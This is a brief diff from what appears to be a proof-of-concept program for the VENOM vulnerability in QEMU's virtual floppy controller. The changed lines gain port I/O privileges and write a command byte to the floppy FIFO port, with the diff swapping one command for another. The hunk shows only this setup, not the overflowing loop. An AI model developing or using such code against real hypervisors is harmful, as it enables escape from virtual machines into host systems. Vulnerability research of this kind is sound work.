@@ -11,8 +11,8 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 int main(void){
         iopl(3);
         ioperm(0x3f5, 1, 1);
-	printf("write spc_command to port\n");
-        outb(SPC_COMMAND, FIFO);
+	// printf("write spc_command to port\n");
+        outb(RDID, FIFO);
         int i,j;
         j = 0;
         printf("into loop\n");
